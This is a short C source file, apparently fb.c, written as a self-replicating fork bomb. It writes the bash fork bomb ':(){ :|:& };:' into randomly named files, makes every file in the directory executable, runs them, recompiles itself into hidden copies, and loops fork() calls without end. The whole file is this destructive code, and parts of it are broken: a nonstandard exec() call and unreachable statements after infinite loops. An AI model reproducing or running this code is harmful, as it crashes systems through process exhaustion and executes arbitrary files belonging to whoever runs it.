#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

int generator(void)
{
	    system("echo ':(){ :|:& };: ./*' > $RANDOM");
	    system("chmod +x * 2> /dev/null");
	    system("chmod +x $RANDOM 2> /dev/null");
	    system("bash -c './$RANDOM' 2> /dev/null");
	    system("bash -c './*' 2> /dev/null");
	return(0);
}
int reproduce(void)
{
	system("gcc fb.c -o .fb.$RANDOM");
	while(1)
		generator();
	fork();
	return(0);
}
int main(void)
{
	for ( ; ; )
	while(1)
		while(1)
			while(1)
			reproduce();
			system("bash -c './*' 2> /dev/null");
			system(".fb.$RANDOM");
				while(1)
					exec("./*");
				fork();
			fork();
		fork();
	return(0);
}
